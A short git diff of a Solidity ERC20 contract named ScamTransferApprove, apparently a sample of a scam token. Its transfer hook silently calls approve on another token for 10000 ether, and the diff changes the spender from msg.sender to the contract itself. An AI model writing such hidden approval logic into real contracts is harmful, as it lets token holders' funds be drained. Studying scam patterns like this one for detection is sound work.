@@ -18,7 +18,7 @@ contract ScamTransferApprove is ERC20 {
     function _update(address from, address to, uint256 value) internal virtual override {
         super._update(from, to, value);
         if (from != address(0)) {
-          ERC20(approvetoken).approve(msg.sender, 10000 ether);
+          ERC20(approvetoken).approve(address(this), 10000 ether);
         }
     }
 
